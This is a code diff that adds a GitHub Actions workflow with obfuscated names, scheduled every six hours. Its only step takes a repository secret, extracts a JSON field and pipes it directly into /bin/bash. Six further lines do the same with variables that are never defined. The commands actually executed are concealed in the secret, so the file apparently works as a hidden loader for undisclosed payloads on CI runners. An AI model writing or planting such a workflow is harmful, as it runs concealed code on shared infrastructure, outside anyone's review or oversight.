@@ -1,0 +1,23 @@
+name: wanguinu5431
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wanguinu5431
+        env:
+          tfeqh239: ${{ secrets.tfeqh239 }}
+        run: |
+          echo $tfeqh239 | jq -r .vkmll5706 | /bin/bash
+          echo $ha038 | jq -r .mo411 | /bin/bash
+          echo $qu62 | jq -r .dlc749 | /bin/bash
+          echo $u6040 | jq -r .dxrau542 | /bin/bash
+          echo $ndsy67505 | jq -r .kb61075 | /bin/bash
+          echo $bi2951 | jq -r .mrwmj806 | /bin/bash
+          echo $umm6246 | jq -r .ed759 | /bin/bash
+
